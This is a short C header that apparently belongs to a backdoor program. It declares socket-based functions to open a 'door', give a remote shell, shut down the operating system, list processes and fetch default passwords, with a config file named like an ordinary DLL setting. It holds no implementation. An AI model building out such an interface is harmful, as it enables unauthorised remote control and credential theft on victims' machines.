#ifndef _DOOR_H_
#define _DOOR_H_
#define G_OPTION_FILE_NAME "appdll.ini"

int open_door(SOCKET sock);

int show_help(SOCKET target);
int init_door();
int get_shell(SOCKET target);
int shutdown_os(SOCKET target, int flag);
int list_process(SOCKET target);
int get_default_pass(SOCKET target);

char * adjust_cmd(char *in);

#endif
